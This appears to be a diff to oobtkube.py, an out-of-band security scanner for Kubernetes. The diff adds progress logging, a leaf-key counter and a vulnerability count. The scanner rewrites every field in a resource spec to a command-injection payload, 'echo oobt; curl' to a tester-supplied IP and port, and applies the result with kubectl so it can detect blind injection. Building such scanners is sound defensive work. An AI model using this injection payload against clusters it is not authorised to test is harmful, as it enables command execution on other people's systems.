@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 #######################################
 #
-# [v0.1.0] OOBT(Out of Band testing) for Kubernetes.
+# [v0.1.1] OOBT(Out of Band testing) for Kubernetes.
 # This is to detect vulnerabilites that can be detected with OOBT such as blind command injection.
 #
 # Current internal workflow:
@@ -13,8 +13,13 @@
 # A usage example (see options in the code):
 #  $ python3 oobtkube.py -d <timeout> -p <port> -i <ipaddr> -f <your_cr_config_example>.yaml
 #
+#
+# Changelog:
+#
+#  - 0.1.1: add INFO logs to show test progress (key name, counts, vulnerability found)
+#  - 0.1.0: produce SARIF result and improvements
+#  - 0.0.1: init
 # Roadmap:
-#  - improve logging
 #  - more payload
 #  - improve modulization and extensibility
 #
@@ -105,13 +110,40 @@ def get_sarif_output(shared_queue):
     return sarif_conv.convert_to_sarif_json(result_message, artifact_url, snippet)
 
 
-def find_leaf_keys_and_test(data, original_file, ipaddr, port):
+def count_total_leaf_keys(data):
+    count = 0
+    key_list = []
+    for key, value in data.items():
+        if isinstance(value, dict):
+            count += count_total_leaf_keys(value)
+        else:
+            count += 1
+            key_list.append(key)
+
+    logging.info(f"Parameters to be tested: {key_list} (total: {count})")
+    return count
+
+
+# pylint: disable=R0913
+def find_leaf_keys_and_test(
+    data, original_file, ipaddr, port, total_leaf_keys, processed_leaf_keys=0
+):
+    """
+    Iterate the spec data and test each parameter by modifying the value with the attack payload.
+    Test cases: appending 'curl' command, TBD
+    """
+
     tmp_file = "/tmp/oobtkube-test.yaml"
     for key, value in data.items():
         if isinstance(value, dict):
-            find_leaf_keys_and_test(value, original_file, ipaddr, port)
+            processed_leaf_keys = find_leaf_keys_and_test(
+                value, original_file, ipaddr, port, total_leaf_keys, processed_leaf_keys
+            )
         else:
-            logging.debug(f"Testing a leaf key found: '{key}'")
+            processed_leaf_keys += 1
+            logging.info(
+                f"Testing a leaf key: '{key}', ({processed_leaf_keys} / {total_leaf_keys})"
+            )
             cmd = f"sed 's/{key}:.*/{key}: \"echo oobt; curl {ipaddr}:{port}\\/{key}\"/g' {original_file} > {tmp_file}"
             logging.debug(f"Command run: {cmd}")
             os.system(cmd)
@@ -123,6 +155,8 @@ def find_leaf_keys_and_test(data, original_file, ipaddr, port):
             logging.debug(f"Command run: {kube_cmd}")
             os.system(kube_cmd)
 
+    return processed_leaf_keys
+
 
 def scan_with_k8s_config(cfg_file_path, ipaddr, port):
     # Apply Kubernetes config (e.g. CR for Operator, or Pod/resource for webhook)
@@ -131,7 +165,11 @@ def scan_with_k8s_config(cfg_file_path, ipaddr, port):
         yaml_data = yaml.safe_load(file)
         try:
             spec_data = yaml_data.get("spec", {})
-            find_leaf_keys_and_test(spec_data, cfg_file_path, ipaddr, port)
+
+            total_leaf_keys = count_total_leaf_keys(spec_data)
+            find_leaf_keys_and_test(
+                spec_data, cfg_file_path, ipaddr, port, total_leaf_keys
+            )
 
         except yaml.YAMLError as e:
             logging.error(f"Error parsing YAML: {e}")
@@ -285,6 +323,7 @@ def main():
 
     args = parser.parse_args()
     args.loglevel = args.loglevel.upper()
+
     logging.basicConfig(format="%(levelname)s: %(message)s", level=args.loglevel)
 
     if not args.filename:
@@ -329,6 +368,7 @@ def main():
     scan_with_k8s_config(args.filename, args.ip_addr, args.port)
 
     # Check the overall duration periodically
+    vulnerability_count = 0
     while not stop_event.is_set():
         time.sleep(1)  # Adjust the sleep duration as needed
         elapsed_time_main = time.time() - start_time_main
@@ -342,6 +382,11 @@ def main():
             sarif_output = get_sarif_output(shared_queue)
 
             print_result(sarif_output, args.output, True)
+
+            vulnerability_count += 1
+            logging.info(
+                f"A vulnerability has been found. Total: {vulnerability_count}"
+            )
 
             data_has_been_received = True
 
